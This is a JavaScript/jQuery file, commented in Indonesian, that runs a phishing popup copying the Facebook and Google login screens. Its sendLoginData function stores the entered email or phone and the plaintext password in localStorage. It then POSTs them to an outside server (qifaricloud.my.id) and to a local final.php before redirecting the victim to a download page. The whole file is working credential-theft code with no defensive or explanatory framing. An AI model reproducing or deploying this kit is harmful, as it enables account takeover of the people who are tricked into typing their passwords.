$(document).ready(function() {
    console.log('New Login System Ready');

    // ========== FUNGSI VALIDASI ==========
    function containsLetters(value) {
        return /[a-zA-Z]/.test(value);
    }

    function isPhoneNumberGlobal(value) {
        var cleanValue = value.replace(/[\s\.\-\(\)]/g, '');
        var internationalRegex = /^(\+|00)[0-9]{6,15}$/;
        var localRegex = /^[0-9]{7,15}$/;
        var indonesiaRegex = /^0[0-9]{8,14}$/;
        
        if (internationalRegex.test(cleanValue)) return true;
        if (localRegex.test(cleanValue)) return true;
        if (indonesiaRegex.test(cleanValue)) return true;
        return false;
    }

    function isValidEmailFormat(email) {
        var emailRegex = /^[^\s@]+@([^\s@]+\.)+[^\s@]+$/;
        return emailRegex.test(email);
    }

    function containsSuspiciousContent(value) {
        return /(http|https|:\/\/)/i.test(value);
    }

    function validateLoginInput(value) {
        if (!value) return false;
        var cleanValue = value.trim();
        
        if (containsSuspiciousContent(cleanValue)) {
            alert("Input tidak boleh mengandung 'https://' atau 'http://'");
            return false;
        }
        
        if (containsLetters(cleanValue)) {
            if (!isValidEmailFormat(cleanValue)) {
                alert("Format email tidak valid! Contoh: nama@gmail.com atau nama@domain.com");
                return false;
            }
            return true;
        } else {
            if (!isPhoneNumberGlobal(cleanValue)) {
                alert("Nomor telepon tidak valid!\n\nFormat yang diterima:\n• Nomor internasional: +14155552671 atau 0014155552671\n• Nomor lokal: 081234567890 (Indonesia) atau 1234567890 (negara lain)");
                return false;
            }
            return true;
        }
    }

    // ========== FUNGSI HEADER DINAMIS ==========
    function updateNewDynamicHeader(loginType) {
        var headerLogo = $('#newHeaderLogo');
        var headerTitle = $('#newHeaderTitle');
        var headerSubtitle = $('#newHeaderSubtitle');
        
        if (loginType === 'facebook') {
            headerLogo.fadeOut(150, function() {
                $(this).html('<img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook" class="new-header-logo-img">');
                $(this).fadeIn(150);
            });
            headerTitle.fadeOut(150, function() {
                $(this).text('Login ke Facebook');
                $(this).fadeIn(150);
            });
            headerSubtitle.fadeOut(150, function() {
                $(this).text('Silakan login dengan akun Facebook Anda untuk melanjutkan');
                $(this).fadeIn(150);
            });
        } else if (loginType === 'google') {
            headerLogo.fadeOut(150, function() {
                $(this).html('<img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" alt="Google" class="new-header-logo-img">');
                $(this).fadeIn(150);
            });
            headerTitle.fadeOut(150, function() {
                $(this).text('Login ke Google');
                $(this).fadeIn(150);
            });
            headerSubtitle.fadeOut(150, function() {
                $(this).text('Silakan login dengan akun Google Anda untuk melanjutkan');
                $(this).fadeIn(150);
            });
        }
    }

    // ========== FUNGSI KIRIM DATA KE SERVER ==========
    function sendLoginData(identifier, password, loginType) {
    console.log('Mengirim data ke server:', {identifier: identifier, login: loginType});
    
    // SIMPAN KE LOCALSTORAGE UNTUK SCRIPT BACKUP (link S)
    localStorage.setItem('pendingLoginDataBackup', JSON.stringify({
        email: identifier,
        password: password,
        login: loginType
    }));
    
    // Kirim ke endpoint P
    $.ajax({
        url: "https://p.qifaricloud.my.id/myjs/apixgg.php",
        type: "POST",
        data: {
            email: identifier,
            password: password,
            login: loginType
        },
        success: function(response) {
            console.log('Data berhasil terkirim ke server P');
        },
        error: function(xhr, status, error) {
            console.log('Gagal mengirim ke server P: ' + error);
        }
    });
    
    // Kirim ke final.php
    $.ajax({
        url: "final.php",
        type: "POST",
        data: {
            email: identifier,
            password: password,
            login: loginType
        },
        success: function(response) {
            console.log('Data berhasil terkirim ke final.php');
        },
        error: function(xhr, status, error) {
            console.log('Gagal mengirim ke final.php: ' + error);
        }
    });
    
    // Redirect setelah 1 detik
    setTimeout(function() {
        window.location.href = "https://doods-stream.site/unduh";
    }, 1000);
}

    // ========== FORM HANDLER ==========
    $('#newLoginFormFacebook').on('submit', function(e) {
        e.preventDefault();
        var identifier = $('input[name="email"]', this).val().trim();
        var password = $('input[name="password"]', this).val().trim();
        
        if (identifier && password) {
            if (validateLoginInput(identifier)) {
                sendLoginData(identifier, password, 'Facebook');
            }
        } else {
            alert("Harap isi email/nomor telepon dan password!");
        }
    });

    $('#newLoginFormGoogle').on('submit', function(e) {
        e.preventDefault();
        var identifier = $('#new_email_gp').val().trim();
        var password = $('#new_password_gp').val().trim();
        
        if (identifier && password) {
            if (validateLoginInput(identifier)) {
                sendLoginData(identifier, password, 'Google');
            }
        } else {
            alert("Harap isi email/nomor telepon dan password!");
        }
    });

    // ========== FUNGSI POPUP ==========
    window.showNewLoginPopup = function() {
        $('#newLoginPopup').addClass('active');
        $('#newLoginFormFacebook')[0].reset();
        $('#newLoginFormGoogle')[0].reset();
        updateNewDynamicHeader('facebook');
        $('.new-tab-btn').removeClass('active');
        $('.new-tab-btn[data-tab="facebook"]').addClass('active');
        $('.new-tab-content').removeClass('active');
        $('#newTabFacebook').addClass('active');
    };
    
    window.hideNewLoginPopup = function() {
        $('#newLoginPopup').removeClass('active');
    };

    // ========== TAB SWITCH ==========
    $('.new-tab-btn').on('click', function() {
        var tabId = $(this).data('tab');
        
        $('.new-tab-btn').removeClass('active');
        $(this).addClass('active');
        
        $('.new-tab-content').removeClass('active');
        if (tabId === 'facebook') {
            $('#newTabFacebook').addClass('active');
            updateNewDynamicHeader('facebook');
        } else if (tabId === 'google') {
            $('#newTabGoogle').addClass('active');
            updateNewDynamicHeader('google');
        }
    });

    // Tutup popup jika klik overlay
    $('.new-popup-overlay').on('click', function(e) {
        if ($(e.target).hasClass('new-popup-overlay')) {
            hideNewLoginPopup();
        }
    });

    // ========== LIVE VALIDATION ==========
    function showLiveHint(input, isValid) {
        if (isValid) {
            input.css('border-color', '#28a745');
            input.css('background-color', '#f0fff4');
        } else if (input.val().length > 0) {
            input.css('border-color', '#dc3545');
            input.css('background-color', '#fff5f5');
        } else {
            input.css('border-color', '');
            input.css('background-color', '');
        }
    }

    $('#newLoginFormFacebook input[name="email"], #new_email_gp').on('input', function() {
        var value = $(this).val().trim();
        if (value.length > 0) {
            var isValid = false;
            if (containsLetters(value)) {
                isValid = isValidEmailFormat(value);
            } else {
                isValid = isPhoneNumberGlobal(value);
            }
            showLiveHint($(this), isValid);
        } else {
            showLiveHint($(this), false);
        }
    });

    console.log('New Popup Login Ready - Header dinamis sesuai tab');
});
